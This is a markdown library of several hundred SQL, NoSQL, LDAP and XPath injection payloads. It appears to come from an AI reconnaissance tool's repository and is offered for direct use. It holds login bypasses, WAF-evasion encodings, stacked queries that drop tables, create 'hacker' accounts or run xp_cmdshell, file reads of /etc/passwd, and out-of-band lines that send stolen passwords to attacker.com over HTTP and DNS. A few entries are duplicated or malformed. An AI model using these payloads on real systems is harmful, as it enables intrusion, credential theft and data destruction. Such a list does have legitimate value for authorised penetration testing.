<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

# Full SQL Injection Payload Library (400+ payloads)

## Error-Based Payloads

### MySQL
```
'
"
' OR '1'='1
' OR 1=1--
' OR '1'='1' --
admin'--
admin' #
admin'/*
' or 1=1--
" or "1"="
') or ('1'='1
" or "1"="1
" or 1=1--
' OR ''='
' OR 'x'='x
" OR "x"="x
') OR ('x')=('x
") OR ("x")=("x
OR 1=1
OR 1=1--
OR 1=1#
OR 1=1/*
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1' #
admin' OR '1'='1'/*
admin" OR "1"="1
admin" OR "1"="1"--
```

### UNION-Based
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT 1,2,3--
' UNION ALL SELECT NULL--
' UNION ALL SELECT NULL,NULL--
' UNION ALL SELECT username,password FROM users--
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 4--+
1' ORDER BY 5--+
1' ORDER BY 6--+
1' ORDER BY 7--+
1' ORDER BY 8--+
1' ORDER BY 9--+
1' ORDER BY 10--+
1' GROUP BY 1--+
1' GROUP BY 2--+
1' GROUP BY 3--+
1' HAVING 1=1--
1' HAVING 1=2--
```

### Boolean-Based (Blind)
```
' AND 1=1--
' AND 1=2--
' AND SLEEP(5)--
' AND BENCHMARK(5000000,MD5('A'))--
' AND (SELECT COUNT(*) FROM users)>0--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND (SELECT 1)=1
' AND (SELECT 1)=2
1 AND 1=1
1 AND 1=2
1' AND '1'='1
1' AND '1'='2
```

### Time-Based
```
' AND SLEEP(5)--
' AND SLEEP(5)#
' AND SLEEP(5)--
' AND BENCHMARK(5000000,MD5('X'))--
' WAITFOR DELAY '00:00:05'--
' AND 1=1; WAITFOR DELAY '00:00:05'--
1; SLEEP(5)#
1'; SLEEP(5)#
1"; SLEEP(5)#
```

### PostgreSQL
```
'; SELECT pg_sleep(5)--
'; SELECT pg_sleep(5)--
'; COPY (SELECT *) TO '/tmp/test'--
' AND 1=1--
' AND 1=2--
' AND 1=1--
```

### MSSQL
```
'; WAITFOR DELAY '00:00:05'--
'; EXEC xp_cmdshell('dir');--
'; EXEC xp_cmdshell('ping 127.0.0.1');--
'; DROP TABLE users;--
'; INSERT INTO users VALUES ('hacker','password');--
' OR 1=1--
" OR 1=1--
```

### Oracle
```
' AND 1=1--
' AND 1=1--
' || '1'='1
' UNION SELECT NULL--
' UNION SELECT NULL FROM dual--
' AND 1=1-- 
```

### SQLite
```
' AND 1=1--
' AND 1=2--
' AND 1=1;--
```

## Stack Queries
```
'; DROP TABLE users;--
'; DROP TABLE users;--
'; EXEC xp_cmdshell('dir');--
'; INSERT INTO users VALUES ('hacker','password');--
'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'password';--
'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';--
'; SHUTDOWN WITH NOWAIT;--
```

## Second-Order
```
admin'--
(Will be stored, then trigger on admin login)
```

## WAF Bypass Techniques

### Comment Obfuscation
```
/**/UN/**/ION/**/SEL/**/ECT/**
/**/OR/**/1=1--
/**/AND/**/1=1--
/**/UNION/**/SELECT/**
/**/SELECT/**/username/**/FROM/**/users--
```

### Encoding
```
%27%20OR%20%271%27%3D%271
%22%20OR%20%221%22%3D%222
%3D%27%20OR%20%271%27%3D%271
%2D%2D%20
```

### Whitespace Variations
```
OR%09id=1
OR%0Aid=1
OR%0Did=1
OR%0A%09id=1
OR%0Aid=1%09
OR%0Aid%0A=1
OR%00id=1
```

### Case Variation
```
UNion SElect
Or 1=1
AnD 1=1
uNiOn aLl SeLeCt
```

### Alternative OR/AND
```
|| id=1
&& id=1
| id=1
& id=1
^ id=1
%0AOR%0Aid=1
%0BOR%0Bid=1
```

### Hex Encoding
```
' OR 0x31=0x31--
' OR 0x31=0x32--
```

### Char Encoding
```
CHAR(39) OR CHAR(49)=CHAR(49)
```

## Database-Specific Payloads

### MySQL
```
' BENCHMARK(1000000,MD5('X'))--
' GROUP_CONCAT(schema_name)--
' INTO OUTFILE '/tmp/test'--
' LOAD_FILE('/etc/passwd')--
' SHOW DATABASES--
' SHOW TABLES--
' SHOW COLUMNS FROM users--
' DESCRIBE users--
' EXPLAIN SELECT * FROM users--
' FLUSH LOGS--
' KILL 1--
```

### PostgreSQL
```
'; COPY (SELECT *) TO '/tmp/test'--
'; CREATE EXTENSION IF NOT EXISTS loop--
'; DROP SCHEMA public CASCADE--
'; SELECT pg_read_file('/etc/passwd', 0, 1000)--
'; SELECT pg_ls_dir('/tmp')--
'; DROP TABLE IF EXISTS users CASCADE--
```

### MSSQL
```
'; EXEC sp_executesql N'SELECT * FROM users'--
'; DECLARE @sql NVARCHAR(100); SET @sql = N'SELECT * FROM users'; EXEC sp_executesql @sql--
'; EXEC xp_cmdshell 'ipconfig'--
'; EXEC xp_fileexist 'C:\windows\system32\drivers\etc\hosts'--
'; EXEC sp_addlogin 'hacker','password'--
'; EXEC sp_grantlogin 'DOMAIN\hacker'--
'; ALTER LOGIN DISABLE--
```

### Oracle
```
' AND 1=1--
' AND 1=1--
' || '1'='1
' UNION SELECT NULL FROM v$version--
' UNION SELECT banner,NULL FROM v$version--
' UNION SELECT username,NULL FROM all_users--
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns--
```

### SQLite
```
' AND 1=1--
' AND 1=2--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT sql,NULL,NULL FROM sqlite_master--
' ATTACH DATABASE '/tmp/test.db'--
```

### MongoDB
'; return db.getCollectionNames(); //
'; return db.users.find(); //
'; return db.adminCommand({listDatabases:1}); //
```

### NoSQL
```
admin'||'1'=='1
admin' OR '1'='1
{"$ne": ""}
{"$gt": ""}
{"$regex": ".*"}
{"$where": "this.password.length > 0"}
```

## Advanced Payloads

### Out-of-Band (OAST)
```
' OR 1=1; EXEC xp_cmdshell('curl http://attacker.com?c='+(SELECT TOP 1 name FROM users));--
' OR 1=1; LOAD_FILE('\\\\attacker.com\\share\\file');--
' OR 1=1; SELECT * INTO OUTFILE '\\\\attacker.com\\share\\file' FROM users;--
```

### DNS Exfiltration
```
' OR 1=1; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\file'));--
' OR 1=1; SELECT EXTRACTVALUE(1,CONCAT(0x5c,(SELECT password FROM users LIMIT 1)))--
```

### Login Bypass
```
admin'--
admin' #
admin'/*
admin' or '1'='1
admin' or 1=1--
admin" or "1"="1
admin" or 1=1--
admin or 1=1--
```

### Comment Stripping Bypass
```
admin'-- - 
admin'# -
admin'/*-
```

### Encoding Variants
```
admin'%09or%091=1
admin'%0Aor%0A1=1
admin'%0Dor%0D1=1
```

### Parameter Pollution
```
id=1&id=1
id=1&id=2
id=1 OR 1=1&id=2
```

### Nested Queries
```
' OR (SELECT COUNT(*) FROM users) > 0 --
' OR (SELECT COUNT(*) FROM users) BETWEEN 0 AND 100--
' OR (SELECT LENGTH(password) FROM users WHERE username='admin') > 5--
```

## File System Access

### MySQL
```
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT 'test' INTO OUTFILE '/tmp/test'--
' UNION SELECT NULL,NULL,NULL INTO DUMPFILE '/tmp/test'--
```

### PostgreSQL
```
' UNION SELECT pg_read_file('/etc/passwd')--
' UNION SELECT pg_ls_dir('/')--
' COPY users TO '/tmp/users'--
```

### MSSQL
```
'; BULK INSERT users FROM 'C:\windows\system32\drivers\etc\hosts';--
'; EXEC xp_dirtree 'C:\';--
'; EXEC xp_subdirs 'C:\';--
```

## Authentication Bypass
```
' OR '1'='1' LIMIT 1--
' OR '1'='1' LIMIT 1-- -
' OR 1=1 LIMIT 1--
admin' OR '1'='1' LIMIT 1#
```

## Privilege Escalation
```
'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';--
'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'password';--
'; DROP USER 'hacker'@'%';--
'; SHOW GRANTS FOR 'hacker'@'%';--
```

##Blind Injection Points
```
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--
' WAITFOR DELAY '00:00:05'--
```

## JSON Injection
```
{"username": "admin' OR '1'='1", "password": "test"}
{"username": "admin\" OR \"1\"=\"1", "password": "test"}
{"username": "admin' OR 1=1--", "password": "test"}
```

## XML Injection
```
<?xml version="1.0"?>
<root>
<username>admin' OR '1'='1</username>
<password>test</password>
</root>
```

## LDAP Injection
```
*)(uid=*))(|(uid=*
*)(objectClass=*
admin)(&(password=*)
```

## XPath Injection
```
' or '1'='1
' or ''='
' or 1=1--
admin' or ''='
```
